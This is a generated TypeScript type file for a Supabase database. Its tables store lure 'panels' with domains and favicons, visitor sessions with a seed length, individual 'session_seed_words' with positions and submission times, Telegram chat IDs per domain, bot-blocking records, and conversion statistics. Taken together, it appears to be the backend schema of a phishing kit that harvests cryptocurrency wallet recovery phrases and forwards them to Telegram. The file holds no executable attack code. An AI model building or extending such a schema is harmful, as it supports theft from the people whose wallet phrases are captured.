export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.5"
  }
  public: {
    Tables: {
      app_settings: {
        Row: {
          id: string
          key: string
          updated_at: string
          value: Json
        }
        Insert: {
          id?: string
          key: string
          updated_at?: string
          value?: Json
        }
        Update: {
          id?: string
          key?: string
          updated_at?: string
          value?: Json
        }
        Relationships: []
      }
      bot_blocks: {
        Row: {
          country: string | null
          created_at: string
          domain: string | null
          id: string
          ip: string
          path: string | null
          reason: string | null
          referer: string | null
          user_agent: string | null
        }
        Insert: {
          country?: string | null
          created_at?: string
          domain?: string | null
          id?: string
          ip: string
          path?: string | null
          reason?: string | null
          referer?: string | null
          user_agent?: string | null
        }
        Update: {
          country?: string | null
          created_at?: string
          domain?: string | null
          id?: string
          ip?: string
          path?: string | null
          reason?: string | null
          referer?: string | null
          user_agent?: string | null
        }
        Relationships: []
      }
      page_visits: {
        Row: {
          country: string | null
          created_at: string
          id: string
          ip: string | null
          panel_id: string | null
          path: string
          referrer: string | null
          user_agent: string | null
        }
        Insert: {
          country?: string | null
          created_at?: string
          id?: string
          ip?: string | null
          panel_id?: string | null
          path: string
          referrer?: string | null
          user_agent?: string | null
        }
        Update: {
          country?: string | null
          created_at?: string
          id?: string
          ip?: string | null
          panel_id?: string | null
          path?: string
          referrer?: string | null
          user_agent?: string | null
        }
        Relationships: [
          {
            foreignKeyName: "page_visits_panel_id_fkey"
            columns: ["panel_id"]
            isOneToOne: false
            referencedRelation: "panels"
            referencedColumns: ["id"]
          },
        ]
      }
      panel_type_settings: {
        Row: {
          config: Json | null
          created_at: string
          device: string | null
          favicon_url: string | null
          id: string
          type: string | null
          updated_at: string
        }
        Insert: {
          config?: Json | null
          created_at?: string
          device?: string | null
          favicon_url?: string | null
          id?: string
          type?: string | null
          updated_at?: string
        }
        Update: {
          config?: Json | null
          created_at?: string
          device?: string | null
          favicon_url?: string | null
          id?: string
          type?: string | null
          updated_at?: string
        }
        Relationships: []
      }
      panels: {
        Row: {
          active: boolean
          created_at: string
          device_type: string
          domain: string | null
          favicon_url: string | null
          id: string
          slug: string | null
          title: string | null
          type: string
          updated_at: string
        }
        Insert: {
          active?: boolean
          created_at?: string
          device_type?: string
          domain?: string | null
          favicon_url?: string | null
          id?: string
          slug?: string | null
          title?: string | null
          type?: string
          updated_at?: string
        }
        Update: {
          active?: boolean
          created_at?: string
          device_type?: string
          domain?: string | null
          favicon_url?: string | null
          id?: string
          slug?: string | null
          title?: string | null
          type?: string
          updated_at?: string
        }
        Relationships: []
      }
      session_events: {
        Row: {
          created_at: string
          event_type: string
          id: string
          payload: Json
          session_id: string
        }
        Insert: {
          created_at?: string
          event_type: string
          id?: string
          payload?: Json
          session_id: string
        }
        Update: {
          created_at?: string
          event_type?: string
          id?: string
          payload?: Json
          session_id?: string
        }
        Relationships: [
          {
            foreignKeyName: "session_events_session_id_fkey"
            columns: ["session_id"]
            isOneToOne: false
            referencedRelation: "sessions"
            referencedColumns: ["id"]
          },
        ]
      }
      session_seed_words: {
        Row: {
          created_at: string
          id: string
          position: number
          session_id: string
          submitted_at: string | null
          updated_at: string
          word: string
        }
        Insert: {
          created_at?: string
          id?: string
          position: number
          session_id: string
          submitted_at?: string | null
          updated_at?: string
          word?: string
        }
        Update: {
          created_at?: string
          id?: string
          position?: number
          session_id?: string
          submitted_at?: string | null
          updated_at?: string
          word?: string
        }
        Relationships: [
          {
            foreignKeyName: "session_seed_words_session_id_fkey"
            columns: ["session_id"]
            isOneToOne: false
            referencedRelation: "sessions"
            referencedColumns: ["id"]
          },
        ]
      }
      sessions: {
        Row: {
          access_token: string
          country: string | null
          created_at: string
          device: string | null
          id: string
          ip: string | null
          last_seen_at: string
          panel_id: string | null
          seed_length: number | null
          status: string
          step: string
          submitted_at: string | null
          updated_at: string
          user_agent: string | null
        }
        Insert: {
          access_token?: string
          country?: string | null
          created_at?: string
          device?: string | null
          id?: string
          ip?: string | null
          last_seen_at?: string
          panel_id?: string | null
          seed_length?: number | null
          status?: string
          step?: string
          submitted_at?: string | null
          updated_at?: string
          user_agent?: string | null
        }
        Update: {
          access_token?: string
          country?: string | null
          created_at?: string
          device?: string | null
          id?: string
          ip?: string | null
          last_seen_at?: string
          panel_id?: string | null
          seed_length?: number | null
          status?: string
          step?: string
          submitted_at?: string | null
          updated_at?: string
          user_agent?: string | null
        }
        Relationships: [
          {
            foreignKeyName: "sessions_panel_id_fkey"
            columns: ["panel_id"]
            isOneToOne: false
            referencedRelation: "panels"
            referencedColumns: ["id"]
          },
        ]
      }
      telegram_chat_ids: {
        Row: {
          active: boolean
          chat_id: string
          created_at: string
          domains: string[]
          id: string
          label: string | null
          updated_at: string
        }
        Insert: {
          active?: boolean
          chat_id: string
          created_at?: string
          domains?: string[]
          id?: string
          label?: string | null
          updated_at?: string
        }
        Update: {
          active?: boolean
          chat_id?: string
          created_at?: string
          domains?: string[]
          id?: string
          label?: string | null
          updated_at?: string
        }
        Relationships: []
      }
      user_roles: {
        Row: {
          created_at: string
          id: string
          role: Database["public"]["Enums"]["app_role"]
          user_id: string
        }
        Insert: {
          created_at?: string
          id?: string
          role: Database["public"]["Enums"]["app_role"]
          user_id: string
        }
        Update: {
          created_at?: string
          id?: string
          role?: Database["public"]["Enums"]["app_role"]
          user_id?: string
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      has_role: {
        Args: {
          _role: Database["public"]["Enums"]["app_role"]
          _user_id: string
        }
        Returns: boolean
      }
      stats_block_reasons: {
        Args: { range_end: string; range_start: string }
        Returns: {
          cnt: number
          reason: string
        }[]
      }
      stats_countries: {
        Args: { range_end: string; range_start: string; top_n?: number }
        Returns: {
          cnt: number
          country: string
        }[]
      }
      stats_devices: {
        Args: { range_end: string; range_start: string }
        Returns: {
          cnt: number
          device: string
        }[]
      }
      stats_funnel: {
        Args: { range_end: string; range_start: string }
        Returns: Json
      }
      stats_kpis: {
        Args: { range_end: string; range_start: string }
        Returns: Json
      }
      stats_panels: {
        Args: { range_end: string; range_start: string }
        Returns: {
          sessions: number
          slug: string
          submissions: number
        }[]
      }
      stats_timeseries: {
        Args: { bucket: string; range_end: string; range_start: string }
        Returns: {
          blocks: number
          bucket_ts: string
          sessions: number
          submissions: number
          visits: number
        }[]
      }
    }
    Enums: {
      app_role: "admin" | "user"
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {
      app_role: ["admin", "user"],
    },
  },
} as const
